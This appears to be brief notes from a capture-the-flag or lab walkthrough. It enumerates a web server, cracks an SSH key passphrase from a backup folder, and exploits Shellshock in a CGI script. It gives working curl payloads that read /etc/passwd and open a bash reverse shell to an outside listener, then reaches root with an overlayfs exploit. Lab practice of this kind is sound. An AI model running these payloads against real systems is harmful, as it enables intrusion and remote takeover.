Started a nmap scan
```
22 OpenSSH 6.6.1p1
80 Apache 2.4.7
```
Started a nikto scan found the same stuff as gobuster 

Started a gobuster scan with list `2.3-medmium` 
```
/cgi-bin
/img
/uploads
/admin
/css
/js
/backup
/secret
```
under the backup folder there is a rsa key using ssh2john we cracked the hash it cracked to `let.....n` 

Doing another gobuster scan on the `secret` folder since I cant find anything and that one is the only one with a picture
Testing out the `admin` folder on the webhost 
running the nikto scan on the `cgi-bin` folder found its vulnerable to shellshock and useing this command we can read the `/etc/passwd` file 
	`curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.92.166/cgi-bin/test.cgi` 
Then to get a reverse shell 
	`curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.13.8.255/9999 0>&1' bash -s :'' http://10.10.92.166/cgi-bin/test.cgi`
And now we are users `www-data` to get root going to use the overlayfs exploit but when we run it the path for gcc is not set to set it we need to run this 
	`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` 
and now we can run the exploit agin and now we are root 